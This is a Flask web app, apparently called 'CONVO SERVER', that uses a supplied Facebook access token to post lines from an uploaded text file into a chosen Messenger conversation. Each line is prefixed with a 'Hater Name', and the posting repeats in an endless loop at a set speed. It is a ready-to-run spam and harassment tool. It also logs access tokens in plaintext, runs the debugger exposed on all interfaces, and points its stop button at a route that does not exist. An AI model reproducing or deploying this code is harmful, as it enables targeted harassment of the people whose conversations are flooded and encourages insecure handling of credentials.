from flask import Flask, request
import requests
import os
from time import sleep
import time
from datetime import datetime
app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        while True:
            try:
                for message1 in messages:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"Message sent using token {access_token}: {message}")
                    else:
                        print(f"Failed to send message using token {access_token}: {message}")
                    time.sleep(time_interval)
            except Exception as e:
                print(f"Error while sending message using token {access_token}: {message}")
                print(e)
                time.sleep(30)


    return '''

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>RAJPUT INSIDX</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body{
      margin: 0;
      font-family: Arial, sans-serif;
      background-image: url('https://i.ibb.co/KVmfPGJ/a40cd0fbd18f9af90516a3ee6ee96aa8.jpg');  
      background-size: cover;
      background-repeat: no-repeat;
      background-position: center;
      color: white;
    }
    .container{
      max-width: 300px;
      background-color: bisque;
      border-radius: 10px;
      padding: 20px;
      box-shadow: 0 0 10px rgba(red, green, blue, alpha);
      margin: 0 auto;
      margin-top: 20px;
    }
    .header{
      text-align: center;
      padding-bottom: 10px;
    }
    .btn-submit{
      width: 100%;
      margin-top: 10px;
    }
    .footer{
      text-align: center;
      margin-top: 10px;
      color: white;
    }
  </style>
</head>
<body>
  <header class="header mt-4">
    <h1 class="mb-3"> 𝐂𝐎𝐍𝐕𝐎 𝐒𝐄𝐑𝐕𝐄𝐑 𝐌𝐀𝐃𝐄 𝐁𝐘
    𝐇𝐀𝐒𝐒𝐀𝐍 𝐑𝐀𝐉𝐏𝐔𝐓   >3:)
    <h1 class="mt-3"> ☠ ||| ꜱᴇʀᴠᴇʀ ᴀᴄᴛɪᴠᴇ ||| ☠ </h1>
  </header>

 <div class="containe">
      <form action="/" method="post" enctype="multipart/form-data">
        <div class="mb-3">
          <label for="accessToken">Enter Your Token:</label>
          <input type="text" class="form-control" id="accessToken" name="accessToken" required>
        </div>
        <div class="mb-3">
          <label for="threadId">Enter Convo/Inbox ID:</label>
          <input type="text" class="form-control" id="threadId" name="threadId" required>
        </div>
        <div class="mb-3">
          <label for="kidx">Enter Hater Name:</label>
          <input type="text" class="form-control" id="kidx" name="kidx" required>
        </div>
        <div class="mb-3">
          <label for="txtFile">Select Your Notepad File:</label>
          <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
        </div>
        <div class="mb-3">
          <label for="time">Speed in Seconds:</label>
          <input type="number" class="form-control" id="time" name="time" required>
        </div>
              <button type="submit" class="btn btn-primary btn-submit">Start Sending Messages</button>
    </form>
    <form method="post" action="/stop">
      <button type="submit" class="btn btn-danger btn-submit mt-3">Stop Sending Messages</button>
    </form>
  </div>
  <footer class="footer">
    <p>&copy; Dont Copy My Server BiTch.</p>
    <p>Follow Me On FB <a href="https://www.facebook.com/hassanRajput038?mibextid=ZbWKwL">HASSAN RAJPUT</a></p>
    <div class="mb-3">
      <a href="https://wa.me/+923417885339" class="whatsapp-link">
        <i class="fab fa-whatsapp"></i> Chat on WhatsApp
      </a>
    </div>
  </footer>
</body>
</html>
    '''


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
    app.run(debug=True)
